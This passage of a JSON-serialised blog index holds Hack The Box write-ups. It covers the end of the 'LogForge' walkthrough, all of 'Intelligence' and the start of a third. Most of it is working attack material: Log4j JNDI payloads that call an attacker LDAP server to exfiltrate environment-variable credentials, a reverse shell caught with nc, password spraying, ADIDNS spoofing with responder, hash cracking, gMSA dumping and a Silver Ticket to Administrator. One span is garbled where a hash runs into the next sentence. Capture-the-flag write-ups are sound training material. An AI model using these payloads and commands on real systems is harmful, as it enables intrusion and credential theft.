bash\u0026#39; \u0026gt; payload.ser And now we start the LDAP server:\n$ java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.17.44:1389 -P payload.ser ... [HTTP_ADDR] \u0026gt;\u0026gt; 10.10.17.44 [RMI_ADDR] \u0026gt;\u0026gt; 10.10.17.44 [LDAP_ADDR] \u0026gt;\u0026gt; 10.10.17.44 ----------------------------JNDI Links---------------------------- Target environment(Build in JDK - (BYPASS WITH GROOVY by @orangetw) whose trustURLCodebase is false and have Tomcat 8+ and Groovy in classpath): rmi://10.10.17.44:1099/fjg93d Target environment(Build in JDK 1.7 whose trustURLCodebase is true): rmi://10.10.17.44:1099/v0aeol ldap://10.10.17.44:1389/v0aeol Target environment(Build in JDK 1.5 whose trustURLCodebase is true): rmi://10.10.17.44:1099/znv8ap ldap://10.10.17.44:1389/znv8ap Target environment(Build in JDK 1.8 whose trustURLCodebase is true): rmi://10.10.17.44:1099/twjpgf ldap://10.10.17.44:1389/twjpgf Target environment(Build in JDK 1.6 whose trustURLCodebase is true): rmi://10.10.17.44:1099/hzdycs ldap://10.10.17.44:1389/hzdycs Target environment(Build in JDK - (BYPASS WITH EL by @welk1n) whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath): rmi://10.10.17.44:1099/w2zulv ----------------------------Server Log---------------------------- [JETTYSERVER] \u0026gt;\u0026gt; Listening on 10.10.17.44:8180 [RMISERVER] \u0026gt;\u0026gt; Listening on 10.10.17.44:1099 [LDAPSERVER] \u0026gt;\u0026gt; Listening on 0.0.0.0:1389 Using Burp Suite again, we can send this JNDI payload: ${jndi:ldap://10.10.17.44:1389/twjpgf} in the same POST request and get a connection in nc:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.138. Ncat: Connection from 10.10.11.138:59150. bash: cannot set terminal process group (789): Inappropriate ioctl for device bash: no job control in this shell tomcat@LogForge:/var/lib/tomcat9$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null tomcat@LogForge:/var/lib/tomcat9$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444  reset xterm tomcat@LogForge:/var/lib/tomcat9$ export TERM=xterm tomcat@LogForge:/var/lib/tomcat9$ export SHELL=bash tomcat@LogForge:/var/lib/tomcat9$ stty rows 50 columns 158 System enumeration There is a user called htb:\ntomcat@LogForge:/var/lib/tomcat9$ ls /home htb Its home directory is readable, and thus we can read the user.txt flag:\ntomcat@LogForge:/var/lib/tomcat9$ ls -la /home/htb total 24 drwxrwxr-x 1 htb htb 174 Dec 21 00:53 . drwxr-xr-x 1 root root 6 Jul 2 18:57 .. lrwxrwxrwx 1 root root 9 Dec 21 00:52 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 htb htb 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 htb htb 3771 Feb 25 2020 .bashrc drwx------ 1 htb htb 40 Jul 2 18:58 .cache -rw-r--r-- 1 htb htb 807 Feb 25 2020 .profile -rw-r--r-- 1 htb htb 0 Jul 2 18:58 .sudo_as_admin_successful -rw------- 1 htb htb 3404 Dec 21 00:53 .viminfo -rw-r--r-- 1 root root 33 Dec 24 05:26 user.txt tomcat@LogForge:/var/lib/tomcat9$ cat /home/htb/user.txt 6b62392136128e4b1d1c2769fee24010 We can recall that port 21 (FTP) was filtered in the output of nmap. In fact, there is an FTP server running on the machine using a custom Java project:\ntomcat@LogForge:/var/lib/tomcat9$ ps -faux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ... root 757 0.0 0.0 5568 3072 ? Ss 05:26 0:00 /usr/sbin/cron -f root 955 0.0 0.0 7248 3372 ? S 05:27 0:00 \\_ /usr/sbin/CRON -f root 962 0.0 0.0 2608 548 ? Ss 05:27 0:00 \\_ /bin/sh -c /root/run.sh root 963 0.0 0.0 5648 3096 ? S 05:27 0:00 \\_ /bin/bash /root/run.sh root 964 0.1 1.7 3576972 70076 ? Sl 05:27 0:25 \\_ java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar Exploring the FTP server Fortunately, the JAR file can be found in the root directory:\ntomcat@LogForge:/var/lib/tomcat9$ ls -la / total 2060 drwxr-xr-x 1 root root 224 Dec 21 20:09 . drwxr-xr-x 1 root root 224 Dec 21 20:09 .. lrwxrwxrwx 1 root root 7 Jul 31 2020 bin -\u0026gt; usr/bin drwxr-xr-x 1 root root 294 Dec 21 01:21 boot drwxr-xr-x 1 root root 0 Jul 2 18:33 cdrom drwxr-xr-x 17 root root 3820 Dec 24 05:26 dev drwxr-xr-x 1 root root 3176 Dec 21 20:04 etc -rw-r--r-- 1 root root 2048143 Dec 18 11:49 ftpServer-1.0-SNAPSHOT-all.jar drwxr-xr-x 1 root root 6 Jul 2 18:57 home lrwxrwxrwx 1 root root 7 Jul 31 2020 lib -\u0026gt; usr/lib lrwxrwxrwx 1 root root 9 Jul 31 2020 lib32 -\u0026gt; usr/lib32 lrwxrwxrwx 1 root root 9 Jul 31 2020 lib64 -\u0026gt; usr/lib64 lrwxrwxrwx 1 root root 10 Jul 31 2020 libx32 -\u0026gt; usr/libx32 drwxr-xr-x 1 root root 0 Jul 31 2020 media drwxr-xr-x 1 root root 0 Jul 31 2020 mnt drwxr-xr-x 1 root root 0 Jul 31 2020 opt dr-xr-xr-x 287 root root 0 Dec 24 05:26 proc drwx------ 1 root root 236 Dec 21 15:10 root drwxr-xr-x 25 root root 740 Dec 24 05:26 run lrwxrwxrwx 1 root root 8 Jul 31 2020 sbin -\u0026gt; usr/sbin drwxr-xr-x 1 root root 0 Jul 31 2020 srv dr-xr-xr-x 13 root root 0 Dec 24 05:26 sys drwxrwxrwt 1 root root 34 Dec 24 05:26 tmp drwxr-xr-x 1 root root 128 Jul 2 19:17 usr drwxr-xr-x 1 root root 106 Dec 14 20:31 var We can transfer it to our machine and decompile it using an online tool, such as javadecompilers.com.\nThere are two main Java files inside the project: Server.java and Worker.java. The second one contains some useful information:\npackage main.java.com.ippsec.ftpServer;  import org.apache.logging.log4j.LogManager; // .. import org.apache.logging.log4j.Logger;  public class Worker extends Thread {  // ...   public Worker(final Socket client, final int dataPort) {  this.debugMode = true;  this.fileSeparator = \u0026#34;/\u0026#34;;  this.transferMode = transferType.ASCII;  this.currentUserStatus = userStatus.NOTLOGGEDIN;  this.validUser = System.getenv(\u0026#34;ftp_user\u0026#34;);  this.validPassword = System.getenv(\u0026#34;ftp_password\u0026#34;);  this.quitCommandLoop = false;  this.controlSocket = client;  this.dataPort = dataPort;  this.currDirectory = \u0026#34;/root\u0026#34;;  this.root = \u0026#34;/\u0026#34;;  }   // ...  } As it can be seen, valid username and password for FTP are stored in some environment variables called ftp_user and ftp_password. Moreover, the FTP server uses Log4j.\nTo obtain the value of these environment variables, we can exploit Log4j JNDI lookups again. Nevertheless, we will not be able to inject a valid serialized object with ysoserial-modified because the Java project does not use any package that is vulnerable to insecure deserialization.\nThen, we can only exfiltrate data through LDAP using the previous LDAP server. To obtain the exfiltrated data, we can make use of Wireshark.\nLDAP exfiltration From the machine, we can connect to the FTP server and inject the JNDI lookup payload while capturing with Wireshark.\ntomcat@LogForge:/var/lib/tomcat9$ cd /tmp tomcat@LogForge:/tmp$ ftp localhost Connected to localhost. 220 Welcome to the FTP-Server Name (localhost:tomcat): ${jndi:ldap://10.10.17.44:1389/${env:ftp_user}:${env:ftp_password}} 530 Not logged in Login failed. Notice that ${env:ftp_user} will print the value of the environment variable called ftp_user.\nThe logs of the LDAP server will tell that a connection was received, but no more useful information. In Wireshark we can see the desired information:\nAs shown above, the FTP credentials are: ippsec:log4j_env_leakage. Now we can login successfully:\nftp\u0026gt; user ippsec 331 User name okay, need password Password: 230-Welcome to HKUST 230 User logged in successfully Remote system type is FTP. ftp\u0026gt; dir 200 Command OK 125 Opening ASCII mode data connection for file list. .profile .ssh snap ftpServer-1.0-SNAPSHOT-all.jar .bashrc .selected_editor run.sh .lesshst .bash_history root.txt .viminfo .cache 226 Transfer complete. At this point, we can download the root.txt flag:\nftp\u0026gt; get root.txt local: root.txt remote: root.txt 200 Command OK 150 Opening ASCII mode data connection for requested file root.txt WARNING! 1 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 File transfer successful. Closing data connection. 33 bytes received in 0.00 secs (210.6311 kB/s) ftp\u0026gt; quit 221 Closing connection tomcat@LogForge:/tmp$ cat root.txt 648bf4d58f9cec00f1720aeb122a4ce0 In order to actually get an interactive shell as root, one could add SSH keys to /root/.ssh. However, the Java FTP server does not work properly, so we cannot overwrite files. Furthermore, the id_rsa stored inside /root/.ssh is not working as expected, because it does not login without password.\n","image":"/images/HTB/LogForge/LogForge.png","permalink":"https://7rocky.github.io/en/htb/logforge/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine uses Log4j in a Tomcat server that is vulnerable to JNDI lookup. Then there is an FTP server made in Java that also uses Log4j, but this time it is only vulnerable to information disclosure. Knowlegde about Log4j exploitation, Tomcat, FTP and Wireshark are needed in order to compromise this machine","time":9,"title":"LogForge"},{"contents":"  OS: Windows   Difficulty: Medium   IP Address: 10.10.10.248   Release: 03 / 07 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.248 -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49229,49667,49691,49692,49704,49713 Nmap scan report for 10.10.10.248 Host is up (0.36s latency).  PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Intelligence 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: ) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-11-16T17:38:25+00:00; +7h15m32s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-11-16T17:38:24+00:00; +7h15m31s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-11-16T17:38:25+00:00; +7h15m32s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-11-16T17:38:24+00:00; +7h15m31s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49229/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49691/tcp open msrpc Microsoft Windows RPC 49692/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49704/tcp open msrpc Microsoft Windows RPC 49713/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: | smb2-time: | date: |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: mean: 7h15m31s, deviation: 0s, median: 7h15m30s  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 103.53 seconds This machine has ports 53 (DNS), 80 (HTTP), 88 (Kerberos), 135 (MS-RPC), 389 (LDAP), 445 (SMB) and 5985 (WinRM) open, within others.\n$ crackmapexec smb 10.10.10.248 SMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) Moreover, we see that the machine is a domain controler (DC) from an Active Directory (AD) environment. We can start adding intelligence.htb into /etc/hosts.\nWeb enumeration If we start looking at http://10.10.10.248, we will see a webpage like this:\nScrolling a bit, we can download two PDF files in the following links:\nWe can also copy the links and downloading using wget from the command line interface:\n$ wget http://10.10.10.248/documents/2020-01-01-upload.pdf $ wget http://10.10.10.248/documents/2020-12-15-upload.pdf Finding usernames in file metadata Taking into account that we must compromise an Active Directory environment, we need to search for users and credentials (maybe NTLM hashes or Kerberos tickets).\nThe PDF files have a Lorem ipsum text inside, nothing interesting at all.\nHowever, these PDF files contain also some metadata. And within these metadata, there are two usernames. We can extract metadata using exiftool:\n$ exiftool *.pdf ======== 2020-01-01-upload.pdf ExifTool Version Number : 12.30 File Name : 2020-01-01-upload.pdf Directory : . File Size : 26 KiB File Modification Date/Time : 2021:04:01 19:00:00+02:00 File Permissions : -rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.5 Linearized : No Page Count : 1 Creator : William.Lee ======== 2020-12-15-upload.pdf ExifTool Version Number : 12.30 File Name : 2020-12-15-upload.pdf Directory : . File Size : 27 KiB File Modification Date/Time : 2021:04:01 19:00:00+02:00 File Permissions : -rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.5 Linearized : No Page Count : 1 Creator : Jose.Williams Now we have two potential usernames. Let\u0026rsquo;s see if they are \u0026ldquo;AS-REP Roastable\u0026rdquo;:\n$ GetNPUsers.py -usersfile users.txt -dc-ip 10.10.10.248 -no-pass intelligence.htb/ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [-] User William.Lee doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User Jose.Williams doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set And they are not. Let\u0026rsquo;s check at least that they are valid domain names with kerbrute:\n$ ./kerbrute userenum --dc dc.intelligence.htb -d intelligence.htb users.txt \u0026gt; Using KDC(s): \u0026gt; dc.intelligence.htb:88 \u0026gt; [+] VALID USERNAME: William.Lee@intelligence.htb \u0026gt; [+] VALID USERNAME: Jose.Williams@intelligence.htb \u0026gt; Done! Tested 2 usernames (2 valid) in 0.123 seconds They are valid, but we have reached a dead end.\nFinding more files and usernames Looking at the PDF filenames (2020-01-01-upload.pdf and 2020-12-15-upload.pdf), we can guess that maybe there are more files stored in the web server with the same naming convention (namely, YYYY-MM-DD-upload.pdf).\nIn order to try all possible files within year 2020, I decided to use of a Go script called reqPdf.go, which will make all the requests and download the found files in less than a second (detailed explanation here):\n$ go run reqPdf.go Fuzzing PDF files of the form: YYYY-MM-DD-upload.pdf Found 84 files in 784.6615ms As it can be seen, 84 files have been downloaded (actually, only 82 are new files). We can extract metadata using exiftool again. This time, we use some shell scripting to filter only the distinct usernames and save them to a file:\n$ exiftool *.pdf | grep Creator | awk \u0026#39;{ print $3 }\u0026#39; | sort -u | tee users.txt Anita.Roberts Brian.Baker Brian.Morris Daniel.Shelton Danny.Matthews Darryl.Harris David.Mcbride David.Reed David.Wilson Ian.Duncan Jason.Patterson Jason.Wright Jennifer.Thomas Jessica.Moody John.Coleman Jose.Williams Kaitlyn.Zimmerman Kelly.Long Nicole.Brock Richard.Williams Samuel.Richardson Scott.Scott Stephanie.Young Teresa.Williamson Thomas.Hall Thomas.Valenzuela Tiffany.Molina Travis.Evans Veronica.Patel William.Lee Let\u0026rsquo;s check if all the got usernames are valid:\n$ ./kerbrute userenum --dc dc.intelligence.htb -d intelligence.htb users.txt \u0026gt; Using KDC(s): \u0026gt; dc.intelligence.htb:88 \u0026gt; [+] VALID USERNAME: Brian.Morris@intelligence.htb \u0026gt; [+] VALID USERNAME: Daniel.Shelton@intelligence.htb \u0026gt; [+] VALID USERNAME: David.Mcbride@intelligence.htb \u0026gt; [+] VALID USERNAME: Ian.Duncan@intelligence.htb \u0026gt; [+] VALID USERNAME: Darryl.Harris@intelligence.htb \u0026gt; [+] VALID USERNAME: Anita.Roberts@intelligence.htb \u0026gt; [+] VALID USERNAME: David.Wilson@intelligence.htb \u0026gt; [+] VALID USERNAME: David.Reed@intelligence.htb \u0026gt; [+] VALID USERNAME: Brian.Baker@intelligence.htb \u0026gt; [+] VALID USERNAME: Danny.Matthews@intelligence.htb \u0026gt; [+] VALID USERNAME: Jason.Patterson@intelligence.htb \u0026gt; [+] VALID USERNAME: John.Coleman@intelligence.htb \u0026gt; [+] VALID USERNAME: Jessica.Moody@intelligence.htb \u0026gt; [+] VALID USERNAME: Jennifer.Thomas@intelligence.htb \u0026gt; [+] VALID USERNAME: Jason.Wright@intelligence.htb \u0026gt; [+] VALID USERNAME: Jose.Williams@intelligence.htb \u0026gt; [+] VALID USERNAME: Nicole.Brock@intelligence.htb \u0026gt; [+] VALID USERNAME: Richard.Williams@intelligence.htb \u0026gt; [+] VALID USERNAME: Kaitlyn.Zimmerman@intelligence.htb \u0026gt; [+] VALID USERNAME: Kelly.Long@intelligence.htb \u0026gt; [+] VALID USERNAME: Thomas.Hall@intelligence.htb \u0026gt; [+] VALID USERNAME: Stephanie.Young@intelligence.htb \u0026gt; [+] VALID USERNAME: Scott.Scott@intelligence.htb \u0026gt; [+] VALID USERNAME: Samuel.Richardson@intelligence.htb \u0026gt; [+] VALID USERNAME: Teresa.Williamson@intelligence.htb \u0026gt; [+] VALID USERNAME: Thomas.Valenzuela@intelligence.htb \u0026gt; [+] VALID USERNAME: Travis.Evans@intelligence.htb \u0026gt; [+] VALID USERNAME: Tiffany.Molina@intelligence.htb \u0026gt; [+] VALID USERNAME: William.Lee@intelligence.htb \u0026gt; [+] VALID USERNAME: Veronica.Patel@intelligence.htb \u0026gt; Done! Tested 30 usernames (30 valid) in 0.355 seconds And they are valid. We can check now if any of them is \u0026ldquo;AS-REP Roastable\u0026rdquo; but none of them is. We have reached another dead end.\nObtaining valid user credentials Now, we can check the contents of all the PDF files. Maybe there is one that does not contain a Lorem ipsum.\nAnd indeed, the file called 2020-06-04.pdf contains the following information:\nNew Account Guide  Welcome to Intelligence Corp! Please login using your username and the default password of: NewIntelligenceCorpUser9876  After logging in please change your password as soon as possible. And also the file 2020-12-30.pdf is readable:\nInternal IT Update  There has recently been some outages on our web servers. Ted has gotten a script in place to help notify us if this happens again. Also, after discussion following our recent security audit we are in the process of locking down our service accounts. The first one tells that every new user is granted the same password in order to login the first time and change the password. Nevertheless, it is probable that someone has forgot to actually change the password.\nThis is a clear situation to perform a password spray attack. Using again kerbrute we get:\n$ ./kerbrute passwordspray --dc dc.intelligence.htb -d intelligence.htb users.txt NewIntelligenceCorpUser9876 \u0026gt; Using KDC(s): \u0026gt; dc.intelligence.htb:88 \u0026gt; [+] VALID LOGIN WITH ERROR: Tiffany.Molina@intelligence.htb:NewIntelligenceCorpUser9876 (Clock skew is too great) \u0026gt; Done! Tested 30 logins (1 successes) in 0.710 seconds And the user called Tiffany.Molina has the default password set yet. With crackmapexec we are able to see if the credentials are valid:\n$ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 SMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) SMB 10.10.10.248 445 DC [+] intelligence.htb\\Tiffany.Molina:NewIntelligenceCorpUser9876 Enumerating SMB shares Now, we can enumerate SMB shares using the credentials found:\n$ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares SMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) SMB 10.10.10.248 445 DC [+] intelligence.htb\\Tiffany.Molina:NewIntelligenceCorpUser9876 SMB 10.10.10.248 445 DC [+] Enumerated shares SMB 10.10.10.248 445 DC Share Permissions Remark SMB 10.10.10.248 445 DC ----- ----------- ------ SMB 10.10.10.248 445 DC ADMIN$ Remote Admin SMB 10.10.10.248 445 DC C$ Default share SMB 10.10.10.248 445 DC IPC$ READ Remote IPC SMB 10.10.10.248 445 DC IT READ SMB 10.10.10.248 445 DC NETLOGON READ Logon server share SMB 10.10.10.248 445 DC SYSVOL READ Logon server share SMB 10.10.10.248 445 DC Users READ User Tiffany.Molina has permissions to read interesting shares called IT and Users. Inside Users we can find the following folders:\n$ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -H 10.10.10.248 -r Users [+] IP: 10.10.10.248:445 Name: intelligence.htb Status: Authenticated  Disk Permissions Comment  ---- ----------- -------  Users READ ONLY  .\\Users\\\\*  dw--w--w-- 0 Mon Apr 19 03:20:26 2021 .  dw--w--w-- 0 Mon Apr 19 03:20:26 2021 ..  dr--r--r-- 0 Mon Apr 19 02:18:39 2021 Administrator  dr--r--r-- 0 Mon Apr 19 05:16:30 2021 All Users  dw--w--w-- 0 Mon Apr 19 04:17:40 2021 Default  dr--r--r-- 0 Mon Apr 19 05:16:30 2021 Default User  fr--r--r-- 174 Mon Apr 19 05:15:17 2021 desktop.ini  dw--w--w-- 0 Mon Apr 19 02:18:39 2021 Public  dr--r--r-- 0 Mon Apr 19 03:20:26 2021 Ted.Graves  dr--r--r-- 0 Mon Apr 19 02:51:46 2021 Tiffany.Molina And here we can get the user.txt flag:\n$ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -H 10.10.10.248 --download \u0026#39;Users\\Tiffany.Molina\\Desktop\\user.txt\u0026#39; [+] Starting download: Users\\Tiffany.Molina\\Desktop\\user.txt (34 bytes) [+] File output to: 10.10.10.248-Users_Tiffany.Molina_Desktop_user.txt $ mv *user.txt user.txt $ cat user.txt d97eb9e4c5535fa637062d14b4b5e8c1 Lateral movement Looking at the IT share, we can see a Powershell script:\n$ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -H 10.10.10.248 -r IT [+] IP: 10.10.10.248:445 Name: intelligence.htb Status: Authenticated  Disk Permissions Comment  ---- ----------- -------  IT READ ONLY  .\\IT\\\\*  dr--r--r-- 0 Mon Apr 19 02:50:58 2021 .  dr--r--r-- 0 Mon Apr 19 02:50:58 2021 ..  fr--r--r-- 1046 Mon Apr 19 02:50:58 2021 downdetector.ps1 $ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -H 10.10.10.248 --download \u0026#39;IT\\downdetector.ps1\u0026#39; [+] Starting download: IT\\downdetector.ps1 (1046 bytes) [+] File output to: /Users/rocky/RockyHack/HackTheBox/Machines/Intelligence/content/smb/10.10.10.248-IT_downdetector.ps1 $ mv *.ps1 downdetector.ps1 The Powershell script is shown below:\n# Check web server status. Scheduled to run every 5 min Import-Module ActiveDirectory foreach ($record in Get-ChildItem \u0026#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb\u0026#34; | Where-Object Name -like \u0026#34;web*\u0026#34;) {  try {  $request = Invoke-WebRequest -Uri \u0026#34;http://$($record.Name)\u0026#34; -UseDefaultCredentials  if (.StatusCode -ne 200) {  Send-MailMessage -From \u0026#39;Ted Graves \u0026lt;Ted.Graves@intelligence.htb\u0026gt;\u0026#39; -To \u0026#39;Ted Graves \u0026lt;Ted.Graves@intelligence.htb\u0026gt;\u0026#39; -Subject \u0026#34;Host: $($record.Name)is down\u0026#34;  }  } catch { } } Basically, what it is doing is checking inside LDAP for subdomains like web*.intelligence.htb and making a request using the credentials of Ted.Graves (every 5 minutes). Recall that one PDF file was talking this script.\nThis time, we can add a subdomain called webrocky.intelligence.htb to the DNS using Tiffany.Molina\u0026rsquo;s credentials that points to our attacker IP address (also known as ADIDNS Spoofing, more information here):\n$ python3 dnstool.py -u \u0026#39;intelligence.htb\\Tiffany.Molina\u0026#39; -p NewIntelligenceCorpUser9876 -a add -t A -d 10.10.17.44 -r webrocky.intelligence.htb 10.10.10.248 [-] Connecting to host... [-] Binding to host [+] Bind OK [-] Adding new record [+] LDAP operation completed successfully Then we can poison the network with responder to obtain the NTLMv2 hash of Ted.Graves (after waiting around 5 minutes):\n# responder -I tun0 -wrf [HTTP] NTLMv2 Client : 10.10.10.248 [HTTP] NTLMv2 Username : intelligence\\Ted.Graves [HTTP] NTLMv2 Hash : Ted.Graves::intelligence:babffe540ac1bow that we have a hash, let\u0026rsquo;s try to crack it with john:\n$ john --wordlist=$WORDLISTS/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64]) Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Mr.Teddy (Ted.Graves) 1g 0:00:00:18 DONE 0.05288g/s 571891p/s 571891c/s 571891C/s Mr5M1rtins..Mr BOB Use the \u0026#34;--show --format=netntlmv2\u0026#34; options to display all of the cracked passwords reliably Session completed. And we found the password. Let\u0026rsquo;s see if the credentials are valid using crackmapexec:\n$ crackmapexec smb 10.10.10.248 -u Ted.Graves -p Mr.Teddy SMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) SMB 10.10.10.248 445 DC [+] intelligence.htb\\Ted.Graves:Mr.Teddy Performing a Silver Ticket attack Here we have another dead end. To continue we must enumerate the Active Directory environment using BloodHound.\nFor that purpose, first we need to generate some JSON files with all the information (domains, computers, users and groups) using bloodhound-python:\n$ bloodhound-python -c all -u Ted.Graves -p Mr.Teddy -d intelligence.htb -dc dc.intelligence.htb -ns 10.10.10.248 --dns-timeout 60 -w 1 INFO: Found AD domain: intelligence.htb INFO: Connecting to LDAP server: dc.intelligence.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 2 computers INFO: Connecting to LDAP server: dc.intelligence.htb INFO: Found 42 users INFO: Found 54 groups INFO: Found 0 trusts INFO: Starting computer enumeration with 1 workers INFO: Querying computer: svc_int.intelligence.htb WARNING: Could not resolve: svc_int.intelligence.htb: The DNS operation timed out after 61.44789505004883 seconds INFO: Querying computer: dc.intelligence.htb INFO: Done in 01M 29S Then we can load these files into BloodHound and search for information to get access to the Domain Controller (DC). We have the following graph:\nAs it is shown above, Ted.Graves belongs to ITSupport group. And the members of this group have the privilege to get the password of svc_int$, which is a group managed service account (gMSA).\nUsing gMSADumper, we can obtain the NTLM hash of this service account:\n$ python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb Users or groups who can read password for svc_int$:  \u0026gt; DC$  \u0026gt; itsupport svc_int$:::b98d4cef68f72a98dfeed732d1b1abca Now that we have the NTLM hash of svc_int$, it\u0026rsquo;s time to perform a Silver Ticket attack.\nAs in every Kerberos attack, first we must synchronize with the server (using ntpdate or rdate):\n# ntpdate 10.10.10.248 ntpdate[25547]: step time server 10.10.10.248 offset +29732.296110 sec And now we can obtain a Silver Ticket to impersonate Administrator using Impacket\u0026rsquo;s getST.py specifying the hash of svc_int$:\n$ getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator -dc-ip 10.10.10.248 -hashes :b98d4cef68f72a98dfeed732d1b1abca intelligence.htb/svc_int$ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Getting TGT for user [*] Impersonating Administrator [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in Administrator.ccache $ export KRB5CCNAME=Administrator.ccache After setting the ticket in KRB5CCNAME environment variable, we can use almost any Impacket tool to gain access to the server using the -k -no-pass flags (for example: smbclient.py, smbexec.py, wmiexec.py or psexec.py).\nUsing wmiexec.py we can access as Administrator and capture the root.txt flag:\n$ wmiexec.py -k -no-pass -dc-ip 10.10.10.248 intelligence.htb/Administrator@dc.intelligence.htb Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] SMBv3.0 dialect used [!] Launching semi-interactive shell - Careful what you execute [!] Press help for extra shell commands C:\\\u0026gt;whoami intelligence\\administrator C:\\\u0026gt;type C:\\Users\\Administrator\\Desktop\\root.txt f8f11214c3520eedde9fa839193356bc ","image":"/images/HTB/Intelligence/Intelligence.png","permalink":"https://7rocky.github.io/en/htb/intelligence/","section":"htb","summary":"Hack The Box. Windows. Medium machine. This machine presents an Active Directory (AD) environment to perform user enumeration, network poisoning and a Silver Ticket attack. Some scripting, DNS operations, AD attacks and BloodHound basics are needed to compromise this machine. This write-up uses a custom Go script to fuzz for files in a web server","time":12,"title":"Intelligence"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.11.128   Release: 22 / 11 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.128 -p 80 Nmap scan report for 10.10.11.128 Host is up (0.040s latency). PORT STATE SERVICE VERSION 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Site doesn't have a title (text/html; 